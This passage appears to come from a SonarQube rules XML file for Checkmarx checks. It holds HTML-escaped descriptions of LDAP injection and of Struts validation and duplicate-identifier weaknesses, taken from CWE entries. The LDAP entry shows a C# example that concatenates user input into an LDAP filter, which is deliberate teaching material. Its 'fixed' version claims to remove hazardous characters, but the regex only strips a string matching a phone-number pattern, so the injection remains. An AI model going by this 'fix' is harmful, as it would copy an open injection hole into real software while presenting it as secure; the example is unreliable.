&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1062</key><name>Potential_LDAP_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could arbitrarily engineer the application&amp;#8217;s LDAP queries. Depending on how the application is using LDAP, the attacker could potentially do any of the following:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Log in as another user&lt;/li&gt;
&lt;li&gt;Escalate privileges&lt;/li&gt;
&lt;li&gt;Steal information&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with an LDAP server, such as Active Directory, by sending a textual LDAP query or command. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain LDAP commands that would be interpreted as such by the LDAP server.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application uses the "user" field string from an HttpRequest to communicate with an LDAP server
      &lt;/h4&gt;&lt;pre&gt;

public class LDAPInjection
{
        public void foo(HttpRequest Request, DirectorySearcher searcher)
        {
                string userName = Request.QueryString["user"];
                searcher.Filter = "(&amp;(samAccountName=" + userName + "))";
        }
}



      &lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters in the "user" string are removed
      &lt;/h4&gt;&lt;pre&gt;

public class LDAPInjectionFixed
{
        public void foo(HttpRequest Request, DirectorySearcher searcher)
        {
                string userName = Request.QueryString["user"];
                userName = Regex.Replace(userName, "^\\d{3}-\\d{3}-\\d{4}$", "");
                searcher.Filter = "(&amp;(samAccountName=" + userName + "))";
        }
}





      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_661</key><name>Struts_Incomplete_Validate_Method_Definition</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Incomplete validate() Method Definition&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;103&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_103_Description" id="oc_103_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The application has a validator form that either fails to
define a validate() method, or defines a validate() method but fails to call
super.validate().&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If you do not call super.validate(), the Validation Framework cannot check
the contents of the form against a validation form. In other words, the
validation framework will be disabled for the given form.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_103_Time of Introduction" id="oc_103_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_103_Applicable Platforms" id="oc_103_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_103_Common Consequences" id="oc_103_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Disabling the validation framework for a form exposes the application
to numerous types of attacks. Unchecked input is the root cause of
vulnerabilities like cross-site scripting, process control, and SQL
injection.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Although J2EE applications are not generally susceptible to memory
corruption attacks, if a J2EE application interfaces with native code
that does not perform array bounds checking, an attacker may be able to
use an input validation mistake in the J2EE application to launch a
buffer overflow attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_103_Potential Mitigations" id="oc_103_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Implement the validate() method and call super.validate() within that
method.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Background Details"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Background Details&lt;/div&gt;&lt;div name="oc_103_Background Details" id="oc_103_Background Details" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;The Struts Validator uses a form's validate() method to check the contents
of the form properties against the constraints specified in the associated
validation form. That means the following classes have a validate() method
that is part of the validation framework: ValidatorForm,
ValidatorActionForm, DynaValidatorForm, and DynaValidatorActionForm. If you
create a class that extends one of these classes, and if your class
implements custom validation logic by overriding the validate() method, you
must call super.validate() in your validate() implementation.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_103_Weakness Ordinalities" id="oc_103_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_103_Relationships" id="oc_103_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;573&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=573" target="_blank"&gt;Failure to Follow Specification&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_103_Relationship Notes" id="oc_103_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This could introduce other weaknesses related to missing input
validation.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('103_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_103_Causal Nature" id="oc_103_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_103_Taxonomy Mappings" id="oc_103_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Erroneous validate() Method&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div name="oc_103_Maintenance Notes" id="oc_103_Maintenance Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The current description implies a loose composite of two separate
weaknesses, so this node might need to be split or converted into a
low-level category.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_103_Content History" id="oc_103_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description,
Maintenance Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Background Details, Common Consequences,
Description, Other Notes, Relationship Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_659</key><name>Struts_Duplicate_Validation_Files</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of Multiple Resources with Duplicate Identifier&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;694&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_694_Description" id="oc_694_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product uses multiple resources that can have the same
identifier, in a context in which unique identifiers are required. This could
lead to operations on the wrong resource, or inconsistent
operations.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_694_Time of Introduction" id="oc_694_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_694_Applicable Platforms" id="oc_694_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_694_Potential Mitigations" id="oc_694_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use unique identifiers.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_694_Other Notes" id="oc_694_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This weakness is probably closely associated with other issues related to
doubling, such as CWE-675 (Duplicate Operations on Resource). It's usually a
case of an API contract violation (CWE-227).&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_694_Relationships" id="oc_694_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;573&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=573" target="_blank"&gt;Failure to Follow Specification&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
